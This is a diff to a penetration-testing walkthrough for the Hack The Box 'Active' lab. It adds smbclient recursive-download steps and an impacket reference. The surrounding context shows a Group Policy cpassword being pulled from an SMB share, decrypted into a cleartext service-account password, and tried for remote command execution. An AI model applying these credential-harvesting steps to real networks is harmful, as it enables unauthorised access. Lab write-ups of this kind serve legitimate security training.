@@ -74,6 +74,11 @@ smbmap -R Replication -H active.htb -A '.*' --depth 40
   # [+] Match found! Downloading: Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI
   # [+] Match found! Downloading: Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
 
+## alternatively, use
+## smb: \> recurse ON
+## smb: \> prompt OFF
+## smb: \> mget *
+
   # in which, the Groups.xml contains account info
   # cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" ... userName="active.htb\SVC_TGS"
 ```
@@ -92,6 +97,14 @@ gpp-decrypt <cpassword>
 ```sh
 smbmap -H active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -x 'net user'
   # [!] Authentication error on active.htb
+```
+
+## AD enum, impacket
+
++ ref: [impacket, github](https://github.com/SecureAuthCorp/impacket)
+
+```sh
+locate impacket
 ```
 
 ## searchsploit
